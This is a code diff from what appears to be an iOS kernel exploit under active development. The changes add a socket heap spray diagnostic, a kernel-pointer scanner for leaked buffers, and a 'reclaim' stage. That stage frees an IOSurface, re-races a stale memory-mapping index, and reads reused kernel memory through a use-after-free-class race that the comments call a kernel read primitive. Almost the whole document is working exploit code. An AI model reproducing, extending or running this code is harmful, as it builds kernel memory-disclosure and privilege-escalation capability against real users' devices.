@@ -80,6 +80,8 @@ static void *rc_swap_thread(void *arg) {
 #define RC_HOLD_MAX 4096
 static int rc_hold[RC_HOLD_MAX];
 static int rc_holdN = 0;
+static int g_rc_log_fd;   /* forward decl: the spray thread's wall diagnostic
+                             runs before the definition below */
 
 /* The ClearSword Socket Spray Thread (SOCK_DGRAM) */
 static void *rc_socket_spray_thread(void *arg) {
@@ -97,6 +99,12 @@ static void *rc_socket_spray_thread(void *arg) {
             fds[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
             if (fds[i] >= 0) {
                 count++;
+            } else if (count == 0 && i == 0) {
+                /* name the wall once (the 12-debugger sockets=0 boot) */
+                if (g_rc_log_fd >= 0)
+                    dprintf(g_rc_log_fd,
+                            "[spray] first socket() failed errno=%d — thread is blind\n",
+                            errno);
             }
         }
 
@@ -291,6 +299,52 @@ static uint32_t rc_hotsync_warm(uint64_t *warm, uint32_t warmNin) {
 }
 
 typedef enum { C_M0, C_CORRECT, C_WRONG, C_FOREIGN, C_ZERO, C_PARTIAL } rc_cls_t;
+static uint64_t g_calibAim = 0;
+
+static void rc_aim(const uint64_t *rbBuf, uint32_t cls, int fdMark,
+                   uint64_t off, unsigned long vm_page_size, uint64_t hmarker) {
+    if (g_calibAim++ >= 12) return;
+    uint64_t kptrs[8] = {0}; int kn = 0, cont = 0, zro = 0;
+    for (size_t qi = 0; qi < RC_NQ; qi++) {
+        uint64_t q = rbBuf[qi];
+        if (q == hmarker) continue;
+        if (q == 0) { zro++; continue; }
+        if ((q >> 36) == 0xfffffff0ull || (q >> 32) == 0xfffffe00ull ||
+            q >= 0xfffffe0000000000ull) {
+            if (kn < 8) kptrs[kn++] = q;
+        }
+        cont++;
+    }
+    rc_log("  AIM %s: content-qwords=%llu zero=%llu KPTR=%llu%s",
+           cls == C_PARTIAL ? "PARTIAL" : (cls == C_WRONG ? "WRONG" : "FOREIGN"),
+           (unsigned long long)cont, (unsigned long long)zro,
+           (unsigned long long)kn, kn ? "  <-- POINTERS" : "");
+    for (int ki = 0; ki < kn; ki++)
+        rc_log("  AIM kptr[%d]=0x%016llx", ki, (unsigned long long)kptrs[ki]);
+    if (kn == 0) {
+        for (int st = 1; st <= 4; st++) {
+            uint8_t wb[RC_NQ * 8];
+            ssize_t wn = pread(fdMark, wb, sizeof(wb), (off_t)off + 0x4000 + (off_t)st * (off_t)vm_page_size);
+            if (wn < 8) break;
+            uint64_t *wq8 = (uint64_t *)wb;
+            int wkn = 0, wcont = 0; uint64_t wfirst = 0;
+            for (size_t qi = 0; qi < RC_NQ; qi++) {
+                uint64_t q = wq8[qi];
+                if (q == 0) continue;
+                wcont++;
+                if (wfirst == 0) wfirst = q;
+                if ((q >> 36) == 0xfffffff0ull || (q >> 32) == 0xfffffe00ull ||
+                    q >= 0xfffffe0000000000ull) wkn++;
+            }
+            if (wcont)
+                rc_log("  AIM-walk +%#02x content=%llu kptr=%llu first=0x%016llx",
+                       (st * 0x4000), (unsigned long long)wcont,
+                       (unsigned long long)wkn, (unsigned long long)wfirst);
+            if (wkn > 0) break;
+        }
+    }
+}
+
 
 static rc_cls_t rc_cls(const uint64_t *buf, uint32_t expected, uint32_t npages,
                        uint64_t *got, int32_t *delta) {
@@ -478,6 +532,23 @@ static CFNumberRef RCNUM(int64_t v) {
     fp = fopen(pm, "w"); fwrite(zbuf, 1, 0x8000, fp); fclose(fp);
     int fdZero = open(pz, O_RDWR);
     int fdMark = open(pm, O_RDWR);
+    /* v3 fd-wall fix (the 12 receipts: H wFail=3000, debugger sockets=0):
+       _CS_DARWIN_USER_TEMP_DIR can be denied in a fresh container and the
+       code never checked. Fall back to Documents and name the failure. */
+    if (fdZero < 0 || fdMark < 0) {
+        rc_log("[scratch] DARWIN_TEMP open failed errno=%d (zero=%d mark=%d) — Documents fallback",
+               errno, fdZero, fdMark);
+        NSString *d2 = [NSSearchPathForDirectoriesInDomains(
+            NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
+        snprintf(pz, sizeof pz, "%s/z%u", [d2 fileSystemRepresentation], arc4random());
+        snprintf(pm, sizeof pm, "%s/m%u", [d2 fileSystemRepresentation], arc4random());
+        fp = fopen(pz, "w"); if (fp) { fwrite(zbuf, 1, 0x8000, fp); fclose(fp); }
+        fp = fopen(pm, "w"); if (fp) { fwrite(zbuf, 1, 0x8000, fp); fclose(fp); }
+        if (fdZero < 0) fdZero = open(pz, O_RDWR);
+        if (fdMark < 0) fdMark = open(pm, O_RDWR);
+        remove(pz); remove(pm);
+        rc_log("[scratch] retry zero=%d mark=%d", fdZero, fdMark);
+    }
     fcntl(fdZero, F_NOCACHE, 1);
     fcntl(fdMark, F_NOCACHE, 1);
     remove(pz); remove(pm);
@@ -814,6 +885,128 @@ static CFNumberRef RCNUM(int64_t v) {
         }
         rc_log("v9 split-sampler: WRONG=%llu FOREIGN=%llu PARTIAL=%llu (negative control)",
                hw, hf, hp);
+    }
+
+    /* ---- v12 RECLAIM: free our page, let the kernel reuse it, re-race
+       the same stale index. FOREIGN content in the window = real kread.
+       PANIC-POSSIBLE (UAF-class by construction); solo tap, one per
+       force-quit; nothing in the existing race bodies is altered. */
+    {
+        IOSurfaceRef reSurf = pCreate((__bridge CFDictionaryRef)@{
+            @"IOSurfaceAllocSize": @(0x8000),
+            @"IOSurfaceMemoryRegion": @"PurpleGfxMem" });
+        if (!reSurf) { rc_log("[v12] surf create fail — stage skipped"); }
+        else {
+            mach_vm_size_t rsz = 0x8000;
+            mach_port_t reObj = 0; mach_vm_address_t reMap = 0;
+            kr = mach_make_memory_entry_64(mach_task_self(), &rsz,
+                (mach_vm_address_t)pBase(reSurf), VM_PROT_DEFAULT, &reObj, 0);
+            if (kr == KERN_SUCCESS)
+                kr = mach_vm_map(mach_task_self(), &reMap, 0x8000, 0,
+                    VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, reObj, 0, false,
+                    VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
+            if (kr != KERN_SUCCESS) {
+                rc_log("[v12] entry/map 0x%x — stage skipped", kr);
+                CFRelease(reSurf);
+            } else {
+                /* fingerprint fill; after release, a post-race window still
+                   carrying rfill proves the page was NOT reused (honest
+                   negative), anything else foreign-class is the hit */
+                static uint64_t rfill = 0, rfill2 = 0;
+                rfill  = ((uint64_t)arc4random() << 32) | arc4random();
+                rfill2 = ~rfill;
+                uint64_t rfillArr[2] = { rfill, rfill2 };
+                for (uint32_t wi = 0; wi < 0x8000 / 16; wi++) {
+                    uint64_t *w = (uint64_t *)reMap + wi * 2;
+                    w[0] = rfill; w[1] = rfill2;
+                }
+                rc_log("--- v12 RECLAIM: create->fingerprint(0x%016llx)->release->"
+                       "re-race (PANIC-POSSIBLE) ---",
+                       (unsigned long long)rfill);
+                /* RELEASE: the kernel backing of reSurf returns its pages
+                   to the free pool (CFRelease drops the last ref; the
+                   fingerprint pages are now reclaimable kernel memory) */
+                CFRelease(reSurf);
+                (void)rfillArr;
+                rc_log("[v12] surface released; spray pressure still on (sockets so far: %llu)",
+                       rc_sprayAllocs);
+                /* re-race the union of this boot's hot offsets via the
+                   replay iter choreography — content that is neither our
+                   tags nor rfill = foreign kernel reuse in the window */
+                uint64_t hw2 = 0, hf2 = 0, hp2 = 0, hown2 = 0, hit2 = 0;
+                int aimDumped = 0;
+                for (uint32_t ho = 0; ho < rc_hotN + 1 && ho < 24; ho++) {
+                    if (rc_hotN == 0 && warmN == 0) break;
+                    uint64_t off = (ho < rc_hotN)
+                        ? rc_hotOffs[ho] : rc_warm[warmN - 1];
+                    uint32_t pg = (uint32_t)(off / vm_page_size);
+                    for (int it2 = 0; it2 < 30; it2++) {
+                        mach_vm_address_t a = pcBig;
+                        mach_vm_map(mach_task_self(), &a, 0x8000, 0,
+                            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObjBig, 0,
+                            false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
+                        memset_pattern8((void *)pcBig, &m0, 0x8000);
+                        pwrite(fdMark, zreset, sizeof(zreset), 0x3f00);
+                        struct iovec iov12 = { (void *)(pcBig + 0x3f00), 0x4000 };
+                        rc_mapAddr = pcBig; rc_mapSize = 0x8000;
+                        rc_mapObj = searchObj; rc_mapOff = (mach_vm_offset_t)off;
+                        rc_raceOn = 1;
+                        pwritev(fdMark, &iov12, 1, 0x3f00);
+                        while (rc_raceOn == 1);
+                        pread(fdMark, rbBuf, sizeof(rbBuf), 0x4000);
+                        uint64_t got2 = 0; int32_t delta2 = 0;
+                        rc_cls_t c12 = rc_cls(rbBuf, pg + 1, npages, &got2, &delta2);
+                        if (c12 == C_WRONG) hw2++;
+                        else if (c12 == C_FOREIGN) {
+                            hf2++;
+                            if (hit2 < 4) {
+                                /* fingerprint check FIRST: rfill still ours */
+                                BOOL ourFp = NO;
+                                for (int qi = 0; qi < RC_NQ; qi++)
+                                    if (rbBuf[qi] == rfill || rbBuf[qi] == rfill2)
+                                        { ourFp = YES; break; }
+                                if (ourFp) hown2++;
+                                else {
+                                    hit2++;
+                                    rc_log("  v12 FOREIGN off=0x%llx q0=0x%016llx q1=0x%016llx "
+                                           "(kernel reuse candidate)",
+                                           (unsigned long long)off, rbBuf[0], rbBuf[1]);
+                                    if (aimDumped < 2) {
+                                        rc_aim(rbBuf, c12, fdMark, off,
+                                               vm_page_size, hmarker);
+                                        aimDumped++;
+                                    }
+                                }
+                            }
+                        }
+                        else if (c12 == C_PARTIAL) {
+                            hp2++;
+                            if (aimDumped < 2) {
+                                rc_aim(rbBuf, c12, fdMark, off,
+                                       vm_page_size, hmarker);
+                                aimDumped++;
+                            }
+                        }
+                    }
+                }
+                rc_log("v12 reclaim: WRONG=%llu FOREIGN=%llu (reuse-hits=%llu "
+                       "fp-still-ours=%llu) PARTIAL=%llu",
+                       hw2, hf2, hit2, hown2, hp2);
+                if (hit2 > 0) {
+                    /* the bandit scores the foreign read immediately */
+                    char fh12[24];
+                    snprintf(fh12, sizeof fh12, "%llu", (unsigned long long)hit2);
+                    LabBanditFeat fe12[2] = { { "stage", "v12-reclaim" },
+                                              { "foreign", fh12 } };
+                    LabBanditRecordFeat("cscali", g_rcUntagged ? 1 : 0,
+                                        LABB_SIG_FOREIGN, LABB_E_DEVICE, fe12, 2);
+                } else {
+                    LabBanditNote("cscali", "v12 reclaim: no foreign reuse captured");
+                }
+                (void)mach_vm_deallocate(mach_task_self(), reMap, 0x8000);
+                (void)mach_port_deallocate(mach_task_self(), reObj);
+            }
+        }
     }
 
     rc_log("READ: WRONG/FOREIGN on either path = primitive alive.");
